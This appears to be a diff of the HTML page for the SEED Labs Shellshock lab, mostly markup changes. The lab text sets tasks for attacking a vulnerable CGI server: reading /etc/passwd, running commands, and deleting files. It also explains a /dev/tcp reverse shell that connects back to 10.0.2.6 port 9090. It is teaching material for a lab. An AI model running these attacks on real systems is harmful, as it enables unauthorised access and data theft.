@@ -1,7 +1,7 @@
 
 
 <!DOCTYPE html>
-<html class="writer-html5" lang="en" >
+<html class="writer-html4" lang="en" >
 <head>
   <meta charset="utf-8" />
   
@@ -13,8 +13,6 @@
   
   <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
   <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
-  <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
-  <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
 
   
   
@@ -31,10 +29,11 @@
   
     
       <script type="text/javascript" id="documentation_options" data-url_root="../../" src="../../_static/documentation_options.js"></script>
-        <script data-url_root="../../" id="documentation_options" src="../../_static/documentation_options.js"></script>
-        <script src="../../_static/jquery.js"></script>
-        <script src="../../_static/underscore.js"></script>
-        <script src="../../_static/doctools.js"></script>
+        <script type="text/javascript" src="../../_static/jquery.js"></script>
+        <script type="text/javascript" src="../../_static/underscore.js"></script>
+        <script type="text/javascript" src="../../_static/doctools.js"></script>
+        <script type="text/javascript" src="../../_static/language_data.js"></script>
+        <script async="async" type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
     
     <script type="text/javascript" src="../../_static/js/theme.js"></script>
 
@@ -210,18 +209,18 @@ educational materials, so instructors can bring them into their
 classrooms in a timely manner and keep their students engaged with what
 happens in the real world. This lab covers the following topics:</p>
 <ul class="simple">
-<li><p>Shellshock</p></li>
-<li><p>Environment variables</p></li>
-<li><p>Function definition in bash</p></li>
-<li><p>Apache and CGI programs</p></li>
+<li>Shellshock</li>
+<li>Environment variables</li>
+<li>Function definition in bash</li>
+<li>Apache and CGI programs</li>
 </ul>
 <p><strong>Readings and videos.</strong> Detailed coverage of the Shellshock attack can be found in the
 following:</p>
 <ul class="simple">
-<li><p>Chapter 3 of the SEED Book, Computer &amp; Internet Security: A Hands-on Approach, 2nd Edition, by
-Wenliang Du. See details at <a class="reference external" href="https://www.handsonsecurity.net">https://www.handsonsecurity.net</a>.</p></li>
-<li><p>Section 3 of the SEED Lecture at Udemy, Computer Security: A Hands-on Approach, by Wenliang
-Du. See details at <a class="reference external" href="https://www.handsonsecurity.net/video.html">https://www.handsonsecurity.net/video.html</a>.</p></li>
+<li>Chapter 3 of the SEED Book, Computer &amp; Internet Security: A Hands-on Approach, 2nd Edition, by
+Wenliang Du. See details at <a class="reference external" href="https://www.handsonsecurity.net">https://www.handsonsecurity.net</a>.</li>
+<li>Section 3 of the SEED Lecture at Udemy, Computer Security: A Hands-on Approach, by Wenliang
+Du. See details at <a class="reference external" href="https://www.handsonsecurity.net/video.html">https://www.handsonsecurity.net/video.html</a>.</li>
 </ul>
 <p><strong>Lab environment.</strong> This lab has been tested on our pre-built Ubuntu 20.04 VM, which can be downloaded
 from the SEED website. Since we use containers to set up the lab environment, this lab does not depend
@@ -417,22 +416,23 @@ the target CGI program. You need to achieve the following objectives.
 For each objective, you only need to use one approach, but in total, you
 need to use three different approaches.</p>
 <ul class="simple">
-<li><p>Task 3.A: Get the server to send back the content of the
-<code class="docutils literal notranslate"><span class="pre">/etc/passwd</span></code> file.</p></li>
-<li><p>Task 3.B: Get the server to tell you its process’ user ID. You can
-use the <code class="docutils literal notranslate"><span class="pre">/bin/id</span></code> command to print out the ID information.</p></li>
-<li><p>Task 3.C: Get the server to create a file inside the <code class="docutils literal notranslate"><span class="pre">/tmp</span></code> folder.
+<li>Task 3.A: Get the server to send back the content of the
+<code class="docutils literal notranslate"><span class="pre">/etc/passwd</span></code> file.</li>
+<li>Task 3.B: Get the server to tell you its process’ user ID. You can
+use the <code class="docutils literal notranslate"><span class="pre">/bin/id</span></code> command to print out the ID information.</li>
+<li>Task 3.C: Get the server to create a file inside the <code class="docutils literal notranslate"><span class="pre">/tmp</span></code> folder.
 You need to get into the container to see whether the file is created
-or not, or use another Shellshock attack to list the <code class="docutils literal notranslate"><span class="pre">/tmp</span></code> folder.</p></li>
-<li><p>Task 3.D: Get the server to delete the file that you just created
-inside the <code class="docutils literal notranslate"><span class="pre">/tmp</span></code> folder.</p></li>
+or not, or use another Shellshock attack to list the <code class="docutils literal notranslate"><span class="pre">/tmp</span></code> folder.</li>
+<li>Task 3.D: Get the server to delete the file that you just created
+inside the <code class="docutils literal notranslate"><span class="pre">/tmp</span></code> folder.</li>
 </ul>
 <p><strong>Questions.</strong> Please answer the following questions:</p>
 <ul>
-<li><p>Question 1: Will you be able to steal the content of the shadow file
+<li><p class="first">Question 1: Will you be able to steal the content of the shadow file
 <code class="docutils literal notranslate"><span class="pre">/etc/shadow</span></code> from the server? Why or why not? The information
-obtained in Task 3.B should give you a clue.</p></li>
-<li><p>Question 2: HTTP GET requests typically attach data in the URL, after
+obtained in Task 3.B should give you a clue.</p>
+</li>
+<li><p class="first">Question 2: HTTP GET requests typically attach data in the URL, after
 the <code class="docutils literal notranslate"><span class="pre">?</span></code> mark. This could be another approach that we can use to
 launch the attack. In the following example, we attach some data in
 the URL, and we found that the data are used to set the following
@@ -464,7 +464,7 @@ from the attacker machine and also prints its output on the attacker’s
 machine. Reverse shell gives attackers a convenient way to run commands
 on a compromised machine. Detailed explanation of how to create a
 reverse shell can be found in the SEED book. We also summarize the
-explanation in Section <a class="reference external" href="#shellshock:sec:reverseshell">4</a>. In this
+explanation in Section&nbsp;<a class="reference external" href="#shellshock:sec:reverseshell">4</a>. In this
 task, you need to demonstrate how you can get a reverse shell from the
 victim using the Shellshock attack.</p>
 </div>
@@ -509,18 +509,18 @@ address is indeed <code class="docutils literal notranslate"><span class="pre">1
 <p>The above command represents the one that would normally be executed on a compromised server. It is
 quite complicated, and we give a detailed explanation in the following:</p>
 <ul class="simple">
-<li><p>“/bin/bash -i”: The option i stands for interactive, meaning that the shell must be interactive
-(must provide a shell prompt).</p></li>
-<li><p>“&gt; /dev/tcp/10.0.2.6/9090”: This causes the output device (<code class="docutils literal notranslate"><span class="pre">stdout</span></code>) of the shell to be
+<li>“/bin/bash -i”: The option i stands for interactive, meaning that the shell must be interactive
+(must provide a shell prompt).</li>
+<li>“&gt; /dev/tcp/10.0.2.6/9090”: This causes the output device (<code class="docutils literal notranslate"><span class="pre">stdout</span></code>) of the shell to be
 redirected to the TCP connection to 10.0.2.6’s port 9090. In Unix systems, stdout’s file
-descriptor is 1.</p></li>
-<li><p>“0&lt;&amp;1”: File descriptor 0 represents the standard input device (<code class="docutils literal notranslate"><span class="pre">stdin</span></code>). This option tells the system
+descriptor is 1.</li>
+<li>“0&lt;&amp;1”: File descriptor 0 represents the standard input device (<code class="docutils literal notranslate"><span class="pre">stdin</span></code>). This option tells the system
 to use the standard output device as the stardard input device. Since stdout is already redirected to
 the TCP connection, this option basically indicates that the shell program will get its input from the
-same TCP connection.</p></li>
-<li><dl class="simple">
-<dt>“2&gt;&amp;1”: File descriptor 2 represents the standard error <code class="docutils literal notranslate"><span class="pre">stderr</span></code>. This causes the error output to be</dt><dd><p>redirected to stdout, which is the TCP connection.</p>
-</dd>
+same TCP connection.</li>
+<li><dl class="first docutils">
+<dt>“2&gt;&amp;1”: File descriptor 2 represents the standard error <code class="docutils literal notranslate"><span class="pre">stderr</span></code>. This causes the error output to be</dt>
+<dd>redirected to stdout, which is the TCP connection.</dd>
 </dl>
 </li>
 </ul>
